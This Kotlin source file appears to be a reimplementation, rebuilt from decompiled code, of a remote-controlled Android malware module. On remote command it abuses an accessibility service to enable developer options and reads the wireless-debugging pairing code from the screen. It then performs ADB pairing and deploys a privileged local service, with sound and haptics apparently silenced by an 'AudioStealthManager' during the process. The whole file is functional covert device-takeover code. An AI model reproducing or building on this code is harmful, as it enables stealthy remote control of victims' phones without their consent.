package com.storm.safe.rock.service.modules.command

import android.content.Intent
import android.util.Log
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject

/**
 * Handles ADB tunnel commands: deploy local service, pairing, wifi debug settings.
 *
 * Reverse-engineered from JADX: C0343a0 (a0, 373 lines).
 * Vendor name: AdbTunnelCommandHandler
 *
 * Supported commands:
 * - DEPLOY_LOCAL_SERVICE, START_PAIRING, OPEN_WIFI_DEBUG_SETTINGS
 * - FULL_DEPLOY, OPEN_ABOUT_PHONE, AUTO_WIRELESS_PAIRING, DIRECT_PAIR
 *
 * Static methods:
 * - a3 -> restoreSoundAndHaptic
 * - a4 -> sendDeployStatus
 * - a5 -> sendCommandResult
 */
class AdbTunnelCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "AdbTunnelCmdHandler"

        // vendor: event type strings use plain literals (vendor uses StringUtil.decrypt obfuscation)
        private const val EVENT_DEPLOY_STATUS = "adb_tunnel_deploy_status"
        private const val EVENT_COMMAND_RESULT = "adb_tunnel_command_result"

        /**
         * Send deploy status event.
         * JADX: m211874a4
         */
        fun sendDeployStatus(context: CommandContext, status: String, message: String) {
            val data = JSONObject().apply {
                put("status", status)
                put("message", message)
            }
            try {
                context.sendEvent(EVENT_DEPLOY_STATUS, data)
            } catch (e: Exception) {
                Log.e(TAG, "发送事件失败", e)
            }
        }

        /**
         * Send command result event.
         * JADX: m211875a5
         */
        fun sendCommandResult(context: CommandContext, success: Boolean, message: String) {
            val data = JSONObject().apply {
                put("success", success)
                put("message", message)
            }
            try {
                context.sendEvent(EVENT_COMMAND_RESULT, data)
            } catch (e: Exception) {
                Log.e(TAG, "发送事件失败", e)
            }
        }

        /**
         * Restore sound and haptic feedback after deployment.
         * JADX: m211873a3
         */
        fun restoreSoundAndHaptic(context: android.content.Context) {
            com.storm.safe.rock.service.modules.overlay.AudioStealthManager(context).forceRestoreDefaults()
        }
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "DEPLOY_LOCAL_SERVICE",
        "START_PAIRING",
        "OPEN_WIFI_DEBUG_SETTINGS",
        "FULL_DEPLOY",
        "OPEN_ABOUT_PHONE",
        "AUTO_WIRELESS_PAIRING",
        "DIRECT_PAIR"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "DEPLOY_LOCAL_SERVICE" -> handleDeployLocalService(context)
            "START_PAIRING" -> handleStartPairing(context)
            "OPEN_WIFI_DEBUG_SETTINGS" -> handleOpenWifiDebugSettings(context)
            "FULL_DEPLOY" -> handleFullDeploy(context)
            "OPEN_ABOUT_PHONE" -> handleOpenAboutPhone(context)
            "AUTO_WIRELESS_PAIRING" -> handleAutoWirelessPairing(context)
            "DIRECT_PAIR" -> handleDirectPair(context)
        }
    }

    /**
     * Deploy local-service.
     * JADX: C0343a0 case "DEPLOY_LOCAL_SERVICE"
     * Vendor launches coroutine via AbstractC0385a0 (CoroutineUtils).
     * AdbTunnelCommandHandler$handleDeployLocalService$1:
     *   - Gets SystemOptimizeManager instance
     *   - Calls m212051d9() (deployLocalService)
     *   - On success: send deploy_success + restoreSoundAndHaptic
     *   - On failure: send deploy_failed
     */
    private suspend fun handleDeployLocalService(context: CommandContext) {
        Log.d(TAG, "★★★ 收到部署 local-service 命令 ★★★")
        withContext(Dispatchers.IO) {
            try {
                sendDeployStatus(context, "deploy_started", "开始部署 local-service...")
                val service = context.service
                if (service == null) {
                    Log.e(TAG, "SystemOptimizeManager 未初始化")
                    sendDeployStatus(context, "deploy_failed", "服务未初始化，请先完成无障碍服务设置")
                    return@withContext
                }
                val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
                if (som == null) {
                    Log.e(TAG, "SystemOptimizeManager 未初始化")
                    sendDeployStatus(context, "deploy_failed", "服务未初始化，请先完成无障碍服务设置")
                    return@withContext
                }
                if (!som.deployLocalServiceWithRetry()) {
                    Log.e(TAG, "★★★ local-service 部署失败 ★★★")
                    sendDeployStatus(context, "deploy_failed", "local-service 部署失败，请确保设备已完成无线调试配对")
                    return@withContext
                }
                Log.d(TAG, "★★★ local-service 部署成功 ★★★")
                sendDeployStatus(context, "deploy_success", "local-service 部署成功！")
                context.service?.let { restoreSoundAndHaptic(it) }
            } catch (e: Exception) {
                Log.e(TAG, "部署 local-service 异常", e)
                sendDeployStatus(context, "deploy_failed", "部署异常: ${e.message}")
            }
        }
    }

    /**
     * Start manual pairing.
     * JADX: C0343a0 case "START_PAIRING"
     * Vendor launches coroutine AdbTunnelCommandHandler$handleStartPairing$1:
     *   - Gets SystemOptimizeManager instance
     *   - Calls m212095k5() (startWirelessPairing)
     */
    private suspend fun handleStartPairing(context: CommandContext) {
        Log.d(TAG, "★★★ 收到手动配对命令 ★★★")
        withContext(Dispatchers.IO) {
            try {
                sendDeployStatus(context, "pairing_started", "正在启动配对流程...")
                val service = context.service
                if (service == null) {
                    sendDeployStatus(context, "pairing_failed", "服务未初始化，请先开启无障碍服务")
                    return@withContext
                }
                val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
                if (som == null) {
                    sendDeployStatus(context, "pairing_failed", "服务未初始化，请先开启无障碍服务")
                    return@withContext
                }
                // ADAPT: 重置内存中的 pairState，否则 PairFlowPreCheck 会因终态跳过
                som.pairOrchestrator.pairState.set(
                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
                )
                som.pairOrchestrator.isPairRunning.set(false)
                som.pairOrchestrator.isFinished.set(false)
                som.pairOrchestrator.processedActions.clear()
                som.startPairFlow()
                sendDeployStatus(context, "pairing_triggered", "配对流程已触发，请等待自动完成...")
            } catch (e: Exception) {
                Log.e(TAG, "启动配对失败", e)
                sendDeployStatus(context, "pairing_failed", "启动配对失败: ${e.message}")
            }
        }
    }

    /**
     * Open wireless debug settings.
     * JADX: C0343a0 case "OPEN_WIFI_DEBUG_SETTINGS"
     * Vendor launches coroutine AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1.
     */
    private suspend fun handleOpenWifiDebugSettings(context: CommandContext) {
        Log.d(TAG, "★★★ 收到打开无线调试设置命令 ★★★")
        withContext(Dispatchers.IO) {
            try {
                val intent = Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.service?.startActivity(intent)
                sendCommandResult(context, true, "已打开开发者选项")
            } catch (e: Exception) {
                Log.e(TAG, "打开无线调试设置失败", e)
                sendCommandResult(context, false, "打开失败: ${e.message}")
            }
        }
    }

    /**
     * Full deploy: initialize SystemOptimizeManager and call forceStart.
     * JADX: C0343a0 case "FULL_DEPLOY"
     * Vendor initializes SystemOptimizeManager (C0360a2) via j41 singleton,
     * then calls forceStart with onSuccess/onFailure callbacks.
     */
    private suspend fun handleFullDeploy(context: CommandContext) {
        Log.d(TAG, "★★★ 收到完整部署命令 ★★★")
        sendDeployStatus(context, "full_deploy_started", "开始完整部署...")
        val service = context.service ?: run {
            sendDeployStatus(context, "full_deploy_failed", "服务未初始化")
            return
        }
        val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
        if (som == null) {
            sendDeployStatus(context, "full_deploy_failed", "SystemOptimizeManager 初始化失败")
            return
        }
        withContext(Dispatchers.IO) {
            try {
                service.getSharedPreferences("system_optimize", 0)
                    .edit().putBoolean("pair_completed", false).apply()
                // ADAPT: 重置内存中的 pairState，否则 PairFlowPreCheck 会因终态跳过
                som.pairOrchestrator.pairState.set(
                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
                )
                som.pairOrchestrator.isPairRunning.set(false)
                som.pairOrchestrator.isFinished.set(false)
                som.pairOrchestrator.processedActions.clear()
                som.startPairFlow()
                sendDeployStatus(context, "full_deploy_triggered", "★★★ 完整部署流程已启动 ★★★")
            } catch (e: Exception) {
                Log.e(TAG, "完整部署失败", e)
                sendDeployStatus(context, "full_deploy_failed", "★★★ 完整部署流程失败: ${e.message} ★★★")
            }
        }
    }

    /**
     * Open About Phone settings.
     * JADX: C0343a0 case "OPEN_ABOUT_PHONE"
     */
    private fun handleOpenAboutPhone(context: CommandContext) {
        Log.d(TAG, "★★★ 打开关于手机 ★★★")
        try {
            val intent = Intent("android.settings.DEVICE_INFO_SETTINGS")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.service?.startActivity(intent)
            sendCommandResult(context, true, "已打开关于手机")
        } catch (e: Exception) {
            Log.e(TAG, "打开关于手机失败", e)
            sendCommandResult(context, false, "打开失败: ${e.message}")
        }
    }

    /**
     * Auto wireless pairing.
     * JADX: C0343a0 case "AUTO_WIRELESS_PAIRING"
     * Vendor: SystemOptimizeManager.getInstance() -> m212095k5() startWirelessPairing
     */
    private suspend fun handleAutoWirelessPairing(context: CommandContext) {
        Log.d(TAG, "★★★ 自动无线配对 ★★★")
        withContext(Dispatchers.IO) {
            try {
                sendDeployStatus(context, "pairing_start", "开始自动配对...")
                val service = context.service
                if (service == null) {
                    sendCommandResult(context, false, "服务未初始化")
                    return@withContext
                }
                val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
                if (som == null) {
                    sendCommandResult(context, false, "SystemOptimizeManager 初始化失败")
                    return@withContext
                }
                // ADAPT: 重置状态
                som.pairOrchestrator.pairState.set(
                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
                )
                som.pairOrchestrator.isPairRunning.set(false)
                som.pairOrchestrator.isFinished.set(false)
                som.pairOrchestrator.processedActions.clear()
                // vendor: AUTO_WIRELESS_PAIRING 先检查开发者模式，未启用则激活
                if (som.isDeveloperOptionsEnabled()) {
                    Log.d(TAG, "开发者模式已启用，直接 startPairFlow")
                    som.startPairFlow()
                } else {
                    Log.d(TAG, "开发者模式未启用，启动 OpenDevelopmentDelegate")
                    som.startOpenDevelopmentDelegate(
                        onSuccess = { Log.d(TAG, "开发者模式激活成功，配对流程已由回调启动") },
                        onFailure = { reason ->
                            Log.e(TAG, "开发者模式激活失败: $reason")
                            sendDeployStatus(context, "pairing_failed", "开发者模式激活失败: $reason")
                        }
                    )
                }
                sendCommandResult(context, true, "配对流程已启动")
            } catch (e: Exception) {
                Log.e(TAG, "自动无线配对异常", e)
                sendDeployStatus(context, "pairing_failed", "配对异常: ${e.message}")
            }
        }
    }

    /**
     * Direct pair: read pairing code from screen.
     * JADX: C0343a0 case "DIRECT_PAIR"
     * Vendor initializes SystemOptimizeManager, then reads pairing code via coroutine
     * AdbTunnelCommandHandler$handleDirectPair$1.
     */
    private suspend fun handleDirectPair(context: CommandContext) {
        Log.d(TAG, "★★★ 直接配对（读取屏幕配对码）★★★")
        try {
            val service = context.service
            if (service == null) {
                sendDeployStatus(context, "direct_pair_failed", "配对管理器未初始化")
                return
            }
            val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
            if (som == null) {
                sendDeployStatus(context, "direct_pair_failed", "配对管理器未初始化")
                return
            }
            sendDeployStatus(context, "direct_pair_start", "正在读取屏幕配对码...")
            withContext(Dispatchers.IO) {
                try {
                    val info = som.uiPortReader.extractPairingCodeAndPort()
                    if (info == null) {
                        sendDeployStatus(context, "direct_pair_failed", "未能从屏幕读取到配对码")
                        return@withContext
                    }
                    Log.i(TAG, "读取到配对码: port=${info.port}, code=${info.pairingCode}")
                    sendDeployStatus(context, "direct_pair_pairing", "配对码已读取，正在执行 SPAKE2 配对...")
                    val success = som.doPair(info.port, info.pairingCode)
                    if (success) {
                        sendDeployStatus(context, "direct_pair_success", "★★★ 直接配对成功 ★★★")
                    } else {
                        sendDeployStatus(context, "direct_pair_failed", "SPAKE2 配对失败")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "直接配对异常", e)
                    sendDeployStatus(context, "direct_pair_failed", "配对异常: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "直接配对异常", e)
            sendDeployStatus(context, "direct_pair_failed", "配对异常: ${e.message}")
        }
    }
}
